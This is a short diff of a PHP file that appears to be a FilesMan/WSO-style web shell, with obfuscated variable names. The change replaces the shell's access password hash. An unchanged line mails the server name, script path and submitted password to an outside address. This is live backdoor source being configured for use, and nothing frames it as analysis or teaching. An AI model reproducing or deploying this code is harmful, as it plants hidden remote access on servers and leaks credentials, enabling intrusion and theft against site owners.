@@ -4,7 +4,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "fa769dac7a0a94ee47d8ebe021eaba9e";
+$▛ = "34e23b8742e16f6160a330e3c0f18e38";
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
